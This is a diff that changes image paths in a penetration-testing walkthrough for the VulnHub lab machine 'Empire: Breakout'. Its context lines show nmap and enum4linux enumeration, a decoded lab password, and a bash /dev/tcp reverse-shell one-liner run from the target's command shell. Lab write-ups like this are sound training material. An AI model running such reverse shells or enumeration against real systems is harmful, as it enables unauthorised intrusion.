@@ -3,7 +3,7 @@
 - **Machine:** Empire: Breakout
 - **Download:** https://www.vulnhub.com/entry/empire-breakout,751/
 
-![](786-1.png)
+![](images/786-1.png)
 
 ---
 
@@ -24,7 +24,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](786-2.png)
+![](images/786-2.png)
 
 ---
 
@@ -36,7 +36,7 @@ Run a comprehensive Nmap scan to enumerate all open ports, services, operating s
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.112
 ```
 
-![](786-3.png)
+![](images/786-3.png)
 
 ---
 
@@ -60,7 +60,7 @@ This command performs an aggressive scan and uses the `http-enum` NSE script to 
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.112
 ```
 
-![](786-4.png)
+![](images/786-4.png)
 
 ---
 
@@ -79,7 +79,7 @@ Visit the following URLs:
 
 View the source code of the web page hosted on port **80**.
 
-![](786-5.png)
+![](images/786-5.png)
 
 An encoded string is discovered within the page source.
 
@@ -91,7 +91,7 @@ Use an online Brainfuck decoder to decode the string.
 
 - https://md5decrypt.net/en/Brainfuck-translator/
 
-![](786-6.png)
+![](images/786-6.png)
 
 ### Decoded Password
 
@@ -111,7 +111,7 @@ Use Enum4linux to enumerate SMB users and shares.
 enum4linux -a 192.168.2.112
 ```
 
-![](786-7.png)
+![](images/786-7.png)
 
 ### Username Discovered
 
@@ -132,11 +132,11 @@ Username : cyber
 Password : .2uqPEfj3D<P'a-3
 ```
 
-![](786-8.png)
+![](images/786-8.png)
 
 Successful authentication.
 
-![](786-9.png)
+![](images/786-9.png)
 
 ---
 
@@ -148,7 +148,7 @@ Successful authentication.
 
 After logging in, navigate to the **Command Shell** module.
 
-![](786-10.png)
+![](images/786-10.png)
 
 ---
 
@@ -168,7 +168,7 @@ Run the following command from the command shell.
 bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'
 ```
 
-![](786-11.png)
+![](images/786-11.png)
 
 ---
 
@@ -176,7 +176,7 @@ bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'
 
 A reverse shell is successfully established.
 
-![](786-12.png)
+![](images/786-12.png)
 
 ---
 
